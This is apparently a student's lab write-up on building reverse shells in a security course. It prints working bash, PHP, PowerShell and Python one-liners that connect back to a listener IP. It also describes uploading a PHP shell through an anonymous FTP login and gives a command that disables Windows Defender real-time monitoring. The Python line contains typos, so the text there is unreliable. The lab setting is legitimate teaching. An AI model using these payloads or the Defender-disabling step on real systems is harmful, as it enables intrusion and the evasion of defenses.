### Overview
---------
This lab we were continuing to work with web shells, however we are now switching to reverse shells. We were first tasked with connecting to a machine called sec335-rocky and creating a reverse shell to connect to a netcat listener that was running. From there we were tasked with uploading a reverse shell to the pippen system that was exploited last week. Following this we were tasked with running a reverse shell on windows but had to first turn of windows defender to do this. Finally, we were tasked with creating a reverse shell using python3. I will go furth into detail on the techniques that I used to complete this lab below. 

### Reflection
------
This was my first time taking a dive into the world of reverse shells and it was a lot of fun and left me wanting more. I definetaly want to explore these more and I feel like it would be an incredibly useful tool to have under my belt later on. I was a little bit confused on how to create a reverse shell using a php as I have not explored how to use php much however, a few resouces online helped me understand that I was essentially using a bash script within a php script. Understanding this concept made everything much easier. 

### Bash Reverse Shell 
------
The first reverse shell that we used was a somewhat simple one just getting us warmed up for the rest of the lab. To start we ran a netcat listener on one terminal using the command `nc -nlvp 4449` meaing that we were listening on port 4449. On another terminal we first logged into our rocky system using ssh and then we ran the command `/bin/bash -i >& /dev/tcp/10.0.17.129/4449 0>&1`. The IP address in that command is the DHCP address of our host machine and the 4449 is the port that we specified when opening the netcat listener. From there we were connected and able to control the rocky machine from our host machine. 

### Uploading a Reverse Shell
------
For this part of the lab, we were tasked with uploading a reverse shell to the pippen server that we exploited last week. To do this, I first had to create the php script that would be uploaded. To do this I used the command in the section above and just built a very simple php script around that, this is what that looked like:

      <?php
      $output1 = exec("/bin/bash -i >& /dev/tcp/10.0.17.129/4449 0>&1");
      
As mentioned in the reflection I know very little php and would love to explore this further. Now with that created I had to login to the Pippen system using the FTP server that I am able to exploit with the anonymous user logon. Once logged in, I navigated to the upload directory and uploaded this script. From there I started another netcat listener using the same port as above. Once the netcat listener was running I navigated to the URL of the file that I uploaded on the pippen FTP server and was connected to the machine. 

### Powershell Reverse Shell
-------
For this task we had to run a reverse shell on our windows box that connected back to our linux box. To do this I needed to again start a netcat listener linsteing on port 4449. Then on the windows machine run run the command `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.17.129',4449); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){;$data= (New-Object -TypeName System.Text.ASCIIENcoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` on the command prompt instead of powershell. However this will not work because Windows Defender blocks this. Reference the section below to turn it off and after disabling it the reverse shell will work. 

###### Turning off Windows Defender over Powershell
To disable Windows Defender simply run the command `Set-MpPreference -DisableRealTimeMonitoring $true` over Powershell. 

### Python3 Reverse Shell
-------
For this final task we were asked to create a reverse shell using python3 to be able to connect back to our linux machine from the rocky machine again. To do this I first had to again create a netcat listener on my linux machine and I was again listening on port 4449. From the we again had to ssh into the rocky machine and run the reverse shell. Below is the command that I used to run the reverse shell:

      python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.17.150"4449));           dub2(s.fileno(),0); dub2(s.fileno(),1); dub2(s.fileno(),2);run(["/bin/bash","-i"]);'
      
After running this I was again connected to the rocky machine through the netcat listener. 
      
